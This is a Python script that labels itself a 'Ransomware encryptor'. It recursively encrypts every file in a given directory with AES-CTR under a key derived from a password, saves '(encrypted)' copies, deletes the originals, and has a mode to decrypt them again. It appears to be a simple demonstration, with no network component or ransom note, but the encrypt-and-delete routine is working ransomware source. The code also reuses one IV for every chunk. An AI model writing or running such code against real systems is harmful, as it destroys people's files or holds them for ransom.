import time
import datetime
import os
import sys
from os import listdir
from os.path import isfile, join
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# generate digest of data input using SHA256
def digestSHA256(data):
    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(data)
    hash =  digest.finalize()
    return hash

# AES encryption of data with key "key" and cipher mode CTR
def encryptAES(data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv), default_backend())
    encryptor = cipher.encryptor()
    encData = encryptor.update(data) + encryptor.finalize()
    return encData

# AES decryption of ciphertext with key "key", initialization vector "iv" and cipher mode CTR
def decryptAES(ciphertext, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv), default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()

def encryptFile(dir, f, key):

	chunksize = 64 * 1024

	outFile = os.path.join(dir, "(encrypted)"+os.path.basename(f))

	filesize = str(os.path.getsize(os.path.join(dir,f))).zfill(16)

	iv = os.urandom(16)

	try:
		with open(os.path.join(dir,f), "rb") as infile:
			with open(outFile, "wb") as outfile:
				outfile.write(filesize.encode())
				outfile.write(iv)
				while True:
					chunk = infile.read(chunksize)

					if len(chunk) == 0:
						break		
					elif len(chunk) % 16 !=0:
						chunk += ' '.encode() *  (16 - (len(chunk) % 16))

					outfile.write(encryptAES(chunk, key, iv))
		os.remove(os.path.join(dir,f))
	except Exception:
		print(Exception)
		return False

	return True

def decryptFile(dir, f, key):

	outFile = os.path.join(dir, os.path.basename(f[11:]))
	chunksize = 64 * 1024

	try:
		with open(os.path.join(dir,f), "rb") as infile:

			filesize = infile.read(16)
			iv = infile.read(16)
			
			with open(outFile, "wb") as outfile:
				while True:
					chunk = infile.read(chunksize)
					if len(chunk) == 0:
						break

					outfile.write(decryptAES(chunk, key, iv))

				outfile.truncate(int(filesize))
		os.remove(os.path.join(dir,f))
	except Exception:
		return False

	return True

def decryptDirectoryTree(dir, key):
	total_files = 0
	decrypted_files = 0
	for root, dirs, files in os.walk(dir):

		level = root.replace(dir, '').count(os.sep)
		indent = ' ' * 4 * (level)
		print('{}{}/'.format(indent, os.path.basename(root)))
		subindent = ' ' * 4 * (level + 1)

		for f in files:
			print('{}{}'.format(subindent, f))

			if(f.startswith("(encrypted)")):			
				if(decryptFile(root, f, key)):
					print("File <{}> : decryption successful".format(f))
					decrypted_files+=1
				else:
					print("File <{}> : decryption failed".format(f))
			total_files+=1

	return total_files, decrypted_files;


def encryptDirectoryTree(dir, key):
	total_files = 0
	encrypted_files = 0
	for root, dirs, files in os.walk(dir):

		level = root.replace(dir, '').count(os.sep)
		indent = ' ' * 4 * (level)
		print('{}{}/'.format(indent, os.path.basename(root)))
		subindent = ' ' * 4 * (level + 1)

		for f in files:
			print('{}{}'.format(subindent, f))

			if(f.startswith("(encrypted)")):
				total_files+=1
				continue
			
			if(encryptFile(root, f, key)):
				print("File <{}> : encryption successful".format(f))
				encrypted_files+=1
			else:
				print("File <{}> : encryption failed".format(f))
			total_files+=1

	return total_files, encrypted_files;

start_time = time.time()

if __name__ == "__main__":
	if(len(sys.argv)!=4):
		print("Usage: encrypt.py <dir> <e|d> <password>")
		sys.exit(1)

	print("> Ransomware encryptor starting...")

	key = digestSHA256((sys.argv[3]).encode())

	if(sys.argv[2] == 'e'):
		cnt_files = encryptDirectoryTree(sys.argv[1],key)
		print("Encrypted {} file(s) [{}\{}] in directory {}".format(cnt_files[1],cnt_files[1],cnt_files[0],sys.argv[1]))

	if(sys.argv[2] == 'd'):
		cnt_files = decryptDirectoryTree(sys.argv[1],key)
		print("Decrypted {} file(s) [{}\{}] in directory {}".format(cnt_files[1],cnt_files[1],cnt_files[0],sys.argv[1]))

	print("Total time of execution : {} ".format(datetime.timedelta(seconds=time.time()-start_time)))
	
